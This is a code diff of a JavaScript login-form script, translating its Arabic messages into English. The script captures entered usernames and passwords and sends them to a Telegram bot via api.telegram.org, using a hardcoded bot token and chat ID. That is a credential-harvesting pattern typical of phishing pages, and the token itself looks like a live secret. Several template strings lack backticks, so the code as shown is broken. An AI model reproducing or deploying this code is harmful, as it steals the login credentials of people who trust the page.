@@ -7,7 +7,7 @@ document.addEventListener("DOMContentLoaded", function() {
     if (username && password) {
       sendToTelegram(username, password);  // إرسال البيانات للبوت
     } else {
-      alert("يرجى إدخال جميع الحقول.");
+      alert("Please fill in all fields.");
     }
   });
 });
@@ -17,8 +17,8 @@ function sendToTelegram(username, password) {
   var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8";  // ضع توكن البوت هنا
   var chatId = "7643313499";      // ضع chat_id هنا
 
-  var message = تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password};  // استخدم backticks هنا
-
+  var message = New login detected:\nUsername: ${username}\nPassword: ${password};
+  
   // بناء الرابط
   var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
 
@@ -27,13 +27,13 @@ function sendToTelegram(username, password) {
     .then(response => response.json())
     .then(data => {
       if (data.ok) {
-        alert("تم إرسال بيانات تسجيل الدخول إلى البوت.");
+        alert("Login data has been sent to the bot.");
       } else {
-        alert("حدث خطأ في إرسال البيانات.");
+        alert("Error occurred while sending data.");
       }
     })
     .catch(error => {
       console.error("Error:", error);
-      alert("حدث خطأ في الاتصال مع البوت.");
+      alert("Error occurred while connecting to the bot.");
     });
 }
